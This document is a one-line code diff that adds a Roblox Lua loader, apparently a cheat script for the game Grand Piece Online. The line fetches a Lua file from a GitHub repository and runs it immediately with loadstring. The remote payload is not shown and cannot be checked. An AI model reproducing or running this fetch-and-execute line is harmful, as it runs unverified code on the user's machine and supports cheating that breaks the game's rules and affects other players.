@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/halloween-pt-2-grand-piece-online-spam3-r0xa8ziko2k8xh.lua"))()
